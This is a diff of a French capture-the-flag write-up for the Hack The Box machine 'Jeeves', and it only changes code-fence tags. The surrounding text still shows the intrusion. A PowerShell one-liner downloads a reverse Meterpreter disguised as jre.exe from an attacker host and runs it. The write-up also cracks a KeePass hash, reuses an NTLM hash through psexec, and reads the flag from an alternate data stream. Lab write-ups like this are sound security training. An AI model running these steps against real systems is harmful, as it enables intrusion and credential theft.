@@ -29,7 +29,7 @@ Ask Jeeves !
 
 On démarre comme d'habitude avec les ports ouverts :  
 
-```plain
+```
 PORT      STATE SERVICE      VERSION
 80/tcp    open  http         Microsoft IIS httpd 10.0
 | http-methods:
@@ -82,7 +82,7 @@ Le module *Metasploit* *auxiliary/scanner/http/jenkins\_command* permet de faire
 
 On peut ainsi lister le contenu du dossier Jenkins :  
 
-```plain
+```
 [+] 10.10.10.63:50000     Directory of C:\Users\Administrator\.jenkins
 [+] 10.10.10.63:50000     
 [+] 10.10.10.63:50000     04/17/2018  09:36 AM    <DIR>          .
@@ -135,7 +135,7 @@ En tant que développeur je ne connais pas *Jenkins* mais je connais mieux *Gitl
 
 Il n'y a plus qu'à créer un nouveau projet vide et rajouter les commandes suivantes pour télécharger et exécuter un reverse *Meterpreter* (j'ai nommé le fichier *jre.exe* pour plus de discrétion) :  
 
-```plain
+```
 powershell.exe -w hidden -nop -ep bypass -c "(new-object net.webclient).DownloadFile('http://10.10.15.67:8000/jre.exe', 'C:\Users\Administrator\.jenkins\logs\jre.exe')" & C:\Users\Administrator\.jenkins\logs\jre.exe') &
 ```
 
@@ -158,7 +158,7 @@ Il est temps de fouiller ailleurs et toujours parmi les fichier de *kohsuke* on 
 
 Après avoir téléchargé le fichier via *Meterpreter* il est temps de trouver quoi en faire... Un simple *apt-cache keepass* suffira à me mettre sur le chemin de *keepass2john* qui permet de convertir le hash de la passphrase maîtresse dans un format cassable via *John The Ripper*.  
 
-```plain
+```
 devloop@kali:~/Documents$ keepass2john CEH.kdbx
 CEH:$keepass$*2*6000*222*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b7
 3766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
@@ -170,7 +170,7 @@ Armé de la wordlist *rockyou* le mot de passe tombe relativement vite (*moonshi
 
 On remarque surtout la présence d'un hash au format Windows (Lanman/NTML) qu'on s'empresse d'utiliser avec le module *psexec* de *Metasploit* :  
 
-```plain
+```
 msf exploit(windows/smb/psexec) > show options
 
 Module options (exploit/windows/smb/psexec):
@@ -223,7 +223,7 @@ Fake news
 
 Avec ces nouveaux privilèges on ne retrouve pas la trace du flag final (*root.txt*). A la place on remarque un fichier texte :  
 
-```plain
+```
 meterpreter > cat "c:\Documents and Settings\Administrator\Desktop\hm.txt"
 The flag is elsewhere.  Look deeper.
 ```
@@ -233,14 +233,14 @@ Victory
 
 J'ai eu recours à l'utilitaire [streams.exe de SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/streams) pour fouiller la présence [d'ADS](https://docs.microsoft.com/en-us/sysinternals/downloads/streams) sur le système, ce qui nous ramène... sur le même fichier :  
 
-```plain
+```
 c:\Documents and Settings\Administrator\Desktop\hm.txt:
 1621538:        :root.txt:$DATA 34
 ```
 
 L'accès au stream alternatif est facilité par le support des *ADS* par *Metasploit* :  
 
-```plain
+```
 meterpreter > cat "c:\Documents and Settings\Administrator\Desktop\hm.txt:root.txt:$DATA"
 afbc5bd4b615a60648cec41c6ac92530
 ```
